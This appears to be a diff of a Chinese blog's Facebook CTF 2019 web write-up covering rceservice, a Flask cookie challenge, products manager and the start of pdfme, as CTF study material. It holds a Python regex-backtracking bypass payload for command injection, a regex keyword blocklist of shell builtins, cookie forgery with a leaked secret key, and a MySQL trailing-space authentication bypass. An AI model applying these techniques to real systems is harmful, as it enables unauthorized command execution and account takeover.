@@ -1,6 +1,103 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>fbctf2019 · damn1t</title><meta name="description" content="Facebook ctf 2019webrceservice题目描述：
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>fbctf2019 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
 
-We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it y"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>fbctf2019</a></h3></div><div class="post-content"><h1 id="Facebook-ctf-2019"><a href="#Facebook-ctf-2019" class="headerlink" title="Facebook ctf 2019"></a>Facebook ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rceservice"><a href="#rceservice" class="headerlink" title="rceservice"></a>rceservice</h3><p>题目描述：</p>
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">fbctf2019</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-06-12</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ctf"> ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Facebook-ctf-2019"><a href="#Facebook-ctf-2019" class="headerlink" title="Facebook ctf 2019"></a>Facebook ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rceservice"><a href="#rceservice" class="headerlink" title="rceservice"></a>rceservice</h3><p>题目描述：</p>
 <blockquote>
 <p>We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it yet we only let you run ‘ls’</p>
 <p><a href="http://challenges.fbctf.com:8085" target="_blank" rel="noopener">http://challenges.fbctf.com:8085</a></p>
@@ -9,9 +106,39 @@ We created this web interface to run commands on our servers, but since we haven
 <p>要求用<code>json</code>格式传送payload<br><img src="https://ramadistra.dev/static/69bcde5f2a66779950b04b31626c4e7a/92980/initial.webp" alt=""></p>
 <p>我们尝试<code>ls</code>：<code>{&quot;cmd&quot;:&quot;ls&quot;}</code></p>
 <p><img src="https://ramadistra.dev/static/ef292e7c05d67c2b8f563690c770eb69/889a8/ls.webp" alt=""></p>
-<p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;cmd&apos;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; elseif (preg_match(&apos;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&apos;, $json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &apos;Attempting to run command:&lt;br/&gt;&apos;;</span><br><span class="line">    $cmd = json_decode($json, true)[&apos;cmd&apos;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;Invalid input&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>暴躁过滤，在线砍人<br>但是我们看到了<code>preg_match</code>,就会想到p神曾经提到的PRCE，利用如下的exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://challenges.fbctf.com:8085/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
-<p>另一种方法，同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法</p>
+<p>题目源码：</p>
+<pre><code>&lt;?php
+
+putenv(&#39;PATH=/home/rceservice/jail&#39;);
+
+if (isset($_REQUEST[&#39;cmd&#39;])) {
+  $json = $_REQUEST[&#39;cmd&#39;];
+
+  if (!is_string($json)) {
+    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
+  } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {
+    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
+  } else {
+    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;
+    $cmd = json_decode($json, true)[&#39;cmd&#39;];
+    if ($cmd !== NULL) {
+      system($cmd);
+    } else {
+      echo &#39;Invalid input&#39;;
+    }
+    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;
+  }
+}
+
+?&gt;
+</code></pre><p>暴躁过滤，在线砍人<br>但是我们看到了<code>preg_match</code>,就会想到p神曾经提到的PRCE，利用如下的exp：</p>
+<pre><code>import requests
+
+payload = &#39;{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#39; + &quot;a&quot;*(1000000) + &#39;&quot;}&#39;
+
+res = requests.post(&quot;http://challenges.fbctf.com:8085/&quot;, data={&quot;cmd&quot;:payload})
+print(res.text)
+</code></pre><p>另一种方法，同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法</p>
 <p><img src="https://i.loli.net/2019/06/10/5cfe6008e1fb886158.png" alt=""></p>
 <p>尝试直接<code>cat</code>，但是返回了空白<br>我们返回去查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，jail应用于当前环境，又根据题目描述的提示–“只允许执行ls命令”，即jail包含了执行<code>ls</code>的二进制文件，所以我们可以直接拉出<code>cat</code>的路径：<code>&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;</code></p>
 <blockquote>
@@ -24,8 +151,9 @@ We created this web interface to run commands on our servers, but since we haven
 <p>(This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).</p>
 </blockquote>
 <p>登录<br><img src="https://i.loli.net/2019/06/10/5cfe6bab2297446330.png" alt=""></p>
-<p>观察cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImEi.XP5j-w.rHcMilGKzEg1FYfcEOR6iqa-B9A</span><br></pre></td></tr></table></figure></p>
-<p>似乎有三段，但加密方式未知，密钥未知<br>我们尝试提交数据，注意到有三个参数需要提交：<br><img src="https://i.loli.net/2019/06/10/5cfe6cc46116a77936.png" alt=""></p>
+<p>观察cookie：</p>
+<pre><code>ImEi.XP5j-w.rHcMilGKzEg1FYfcEOR6iqa-B9A
+</code></pre><p>似乎有三段，但加密方式未知，密钥未知<br>我们尝试提交数据，注意到有三个参数需要提交：<br><img src="https://i.loli.net/2019/06/10/5cfe6cc46116a77936.png" alt=""></p>
 <p>既然提示了<code>cookie</code>和<code>string format</code>，admin是未允许的状态，所以思路是篡改cookie，伪装为admin，继而拿到flag，通常有一个思路是：利用SSTI，获取密钥，然后重新签名生成cookie。所以如何利用SSTI呢？<br>通过一番尝试，三个参数中，<code>event_important</code>是可利用点</p>
 <ul>
 <li>我们输入<code>__dict__</code>，成功回显</li>
@@ -37,29 +165,111 @@ We created this web interface to run commands on our servers, but since we haven
 <li><p>于是进行签名</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = b&apos;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&apos;</span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
-<p>将得到的cookie去修改原<code>user</code>的cookie即可得到flag</p>
+<pre><code>from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = b&#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;
+
+session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+
+@app.route(&#39;/&#39;)
+def index():
+    print(session_serializer.dumps(&quot;admin&quot;))
+
+index()
+</code></pre><p>将得到的cookie去修改原<code>user</code>的cookie即可得到flag</p>
 <h3 id="products-manager"><a href="#products-manager" class="headerlink" title="products manager"></a>products manager</h3><p>题目给出了源码：</p>
 <ul>
 <li>在db.php中：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">INSERT INTO products VALUES(&apos;facebook&apos;, sha256(....), &apos;FLAG_HERE&apos;);</span><br><span class="line">INSERT INTO products VALUES(&apos;messenger&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;instagram&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;whatsapp&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;oculus-rift&apos;, sha256(....), ....);</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-<p>给出了表结构，且提示很明显，再看主页面：<br><img src="https://i.loli.net/2019/06/11/5cfe8685b49df61035.png" alt=""></p>
+<pre><code>/*
+INSERT INTO products VALUES(&#39;facebook&#39;, sha256(....), &#39;FLAG_HERE&#39;);
+INSERT INTO products VALUES(&#39;messenger&#39;, sha256(....), ....);
+INSERT INTO products VALUES(&#39;instagram&#39;, sha256(....), ....);
+INSERT INTO products VALUES(&#39;whatsapp&#39;, sha256(....), ....);
+INSERT INTO products VALUES(&#39;oculus-rift&#39;, sha256(....), ....);
+*/
+</code></pre><p>给出了表结构，且提示很明显，再看主页面：<br><img src="https://i.loli.net/2019/06/11/5cfe8685b49df61035.png" alt=""></p>
 <p>三个功能，add是添加产品<br><img src="https://i.loli.net/2019/06/11/5cfe86c76c0c145917.png" alt=""></p>
-<p>view可以查询<br><img src="https://i.loli.net/2019/06/11/5cfe8707a0af441607.png" alt=""><br>我们再查看view.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($name) &amp;&amp; $name !== &quot;&quot;</span><br><span class="line">      &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123;</span><br><span class="line">  if (check_name_secret($name, hash(&apos;sha256&apos;, $secret)) === false) &#123;</span><br><span class="line">    return &quot;Incorrect name or secret, please try again&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  $product = get_product($name);</span><br><span class="line">  echo &quot;&lt;p&gt;Product details:&quot;;</span><br><span class="line">  echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&apos;name&apos;]) . &quot;&lt;/li&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;li&gt;&quot; . htmlentities($product[&apos;description&apos;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
-<p>/db.php::check_name_secret源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_name_secret($name, $secret) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $valid = false;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;ss&quot;, $name, $secret);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  if ($res-&gt;fetch_assoc() !== null) &#123;</span><br><span class="line">    $valid = true;</span><br><span class="line">  &#125;</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>/db.php::get_product源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function get_product($name) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name, description FROM products WHERE name = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;s&quot;, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点<br>这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格<br><img src="https://i.loli.net/2019/06/11/5cfe897b3282f80821.png" alt=""></p>
+<p>view可以查询<br><img src="https://i.loli.net/2019/06/11/5cfe8707a0af441607.png" alt=""><br>我们再查看view.php:</p>
+<pre><code>  if (isset($name) &amp;&amp; $name !== &quot;&quot;
+        &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) {
+    if (check_name_secret($name, hash(&#39;sha256&#39;, $secret)) === false) {
+      return &quot;Incorrect name or secret, please try again&quot;;
+    }
+    $product = get_product($name);
+    echo &quot;&lt;p&gt;Product details:&quot;;
+    echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&#39;name&#39;]) . &quot;&lt;/li&gt;&quot;;
+    echo &quot;&lt;li&gt;&quot; . htmlentities($product[&#39;description&#39;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;;
+</code></pre><p>/db.php::check_name_secret源码如下：</p>
+<pre><code>function check_name_secret($name, $secret) {
+  global $db;
+  $valid = false;
+  $statement = $db-&gt;prepare(
+    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;
+  );
+  check_errors($statement);
+  $statement-&gt;bind_param(&quot;ss&quot;, $name, $secret);
+  check_errors($statement-&gt;execute());
+  $res = $statement-&gt;get_result();
+  check_errors($res);
+  if ($res-&gt;fetch_assoc() !== null) {
+    $valid = true;
+  }
+  $statement-&gt;close();
+  return $valid;
+}
+</code></pre><p>/db.php::get_product源码如下：</p>
+<pre><code>function get_product($name) {
+  global $db;
+  $statement = $db-&gt;prepare(
+    &quot;SELECT name, description FROM products WHERE name = ?&quot;
+  );
+  check_errors($statement);
+  $statement-&gt;bind_param(&quot;s&quot;, $name);
+  check_errors($statement-&gt;execute());
+  $res = $statement-&gt;get_result();
+  check_errors($res);
+  $product = $res-&gt;fetch_assoc();
+  $statement-&gt;close();
+  return $product;
+}
+</code></pre><p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点<br>这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格<br><img src="https://i.loli.net/2019/06/11/5cfe897b3282f80821.png" alt=""></p>
 <p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
-<h3 id="pdfme"><a href="#pdfme" class="headerlink" title="pdfme"></a>pdfme</h3><p><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/start.png" alt=""><br>只能上传<code>.fods</code>文件，在网上找了个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;office:document xmlns:office=&quot;urn:oasis:names:tc:opendocument:xmlns:office:1.0&quot;  xmlns:style=&quot;urn:oasis:names:tc:opendocument:xmlns:style:1.0&quot;  xmlns:text=&quot;urn:oasis:names:tc:opendocument:xmlns:text:1.0&quot;  xmlns:table=&quot;urn:oasis:names:tc:opendocument:xmlns:table:1.0&quot;  xmlns:draw=&quot;urn:oasis:names:tc:opendocument:xmlns:drawing:1.0&quot;  xmlns:fo=&quot;urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0&quot;  xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;  xmlns:meta=&quot;urn:oasis:names:tc:opendocument:xmlns:meta:1.0&quot;  xmlns:number=&quot;urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0&quot;  xmlns:presentation=&quot;urn:oasis:names:tc:opendocument:xmlns:presentation:1.0&quot;  xmlns:svg=&quot;urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0&quot;  xmlns:chart=&quot;urn:oasis:names:tc:opendocument:xmlns:chart:1.0&quot;  xmlns:dr3d=&quot;urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0&quot;  xmlns:math=&quot;http://www.w3.org/1998/Math/MathML&quot;  xmlns:form=&quot;urn:oasis:names:tc:opendocument:xmlns:form:1.0&quot;  xmlns:script=&quot;urn:oasis:names:tc:opendocument:xmlns:script:1.0&quot;  xmlns:config=&quot;urn:oasis:names:tc:opendocument:xmlns:config:1.0&quot;  xmlns:ooo=&quot;http://openoffice.org/2004/office&quot;  xmlns:ooow=&quot;http://openoffice.org/2004/writer&quot;  xmlns:oooc=&quot;http://openoffice.org/2004/calc&quot;  xmlns:dom=&quot;http://www.w3.org/2001/xml-events&quot;  xmlns:xforms=&quot;http://www.w3.org/2002/xforms&quot;  xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xmlns:rpt=&quot;http://openoffice.org/2005/report&quot;  xmlns:of=&quot;urn:oasis:names:tc:opendocument:xmlns:of:1.2&quot;  xmlns:xhtml=&quot;http://www.w3.org/1999/xhtml&quot;  xmlns:grddl=&quot;http://www.w3.org/2003/g/data-view#&quot;  xmlns:tableooo=&quot;http://openoffice.org/2009/table&quot;  xmlns:drawooo=&quot;http://openoffice.org/2010/draw&quot;  xmlns:calcext=&quot;urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0&quot;  xmlns:loext=&quot;urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0&quot;  xmlns:field=&quot;urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0&quot;  xmlns:formx=&quot;urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0&quot;  xmlns:css3t=&quot;http://www.w3.org/TR/css3-text/&quot; office:version=&quot;1.2&quot; office:mimetype=&quot;application/vnd.oasis.opendocument.spreadsheet&quot;&gt;</span><br><span class="line">    &lt;office:body&gt;</span><br><span class="line">        &lt;office:spreadsheet&gt;</span><br><span class="line">            &lt;table:table table:name=&quot;1&quot;&gt;</span><br><span class="line">                &lt;table:table-column/&gt;</span><br><span class="line">                &lt;table:table-row&gt;</span><br><span class="line">                    &lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">                        &lt;text:p&gt;TEXT&lt;/text:p&gt;</span><br><span class="line">                    &lt;/table:table-cell&gt;</span><br><span class="line">                &lt;/table:table-row&gt;</span><br><span class="line">                &lt;table:table-row&gt;&lt;/table:table-row&gt;</span><br><span class="line">            &lt;/table:table&gt;</span><br><span class="line">            &lt;table:named-expressions/&gt;</span><br><span class="line">        &lt;/office:spreadsheet&gt;</span><br><span class="line">    &lt;/office:body&gt;</span><br><span class="line">&lt;/office:document&gt;</span><br></pre></td></tr></table></figure></p>
-<p>他会渲染为pdf：</p>
